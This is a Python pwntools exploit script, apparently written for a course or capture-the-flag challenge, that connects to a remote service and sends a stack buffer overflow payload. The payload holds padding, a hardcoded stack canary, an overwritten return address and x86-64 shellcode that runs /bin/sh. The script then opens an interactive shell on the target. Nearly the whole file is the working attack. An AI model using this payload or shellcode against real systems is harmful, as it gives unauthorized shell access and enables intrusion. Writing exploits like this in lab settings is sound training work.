from pwn import *
import time
import struct
import time

context.arch = "amd64"

print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("")

p = remote("csc748.hostbin.org", 7033)
response = p.recvuntil("Halt, who goes there?\n").decode("utf-8")
print(response)
print("")

payload = b'AAAAAAAAAAAAAAAAAAAAAAAA\x00\xa5\xb6\xf0\xd7\xae\x9d\xf6BBBBBBBB\xc5\x14@\x00\x00\x00\x00\x00jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

p.clean()
p.sendline(payload)

p.interactive()

